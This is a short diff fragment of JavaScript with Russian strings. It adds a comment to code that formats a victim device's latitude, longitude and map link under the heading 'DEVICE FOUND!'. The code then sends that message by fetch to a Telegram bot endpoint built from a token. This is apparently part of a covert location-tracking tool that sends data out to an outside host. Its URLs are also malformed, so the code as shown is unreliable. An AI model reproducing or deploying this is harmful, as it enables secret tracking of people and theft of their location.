@@ -40,6 +40,7 @@
                     
                     const textMessage = `[+] УСТРОЙСТВО НАЙДЕНО!\nШирота: ${lat}\nДолгота: ${lon}\nКарта: https://google.com{lat},${lon}`;
                     
+                                        // Отправляем данные напрямую в Telegram API
                     fetch('https://telegram.org' + TELEGRAM_TOKEN + '/sendMessage', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
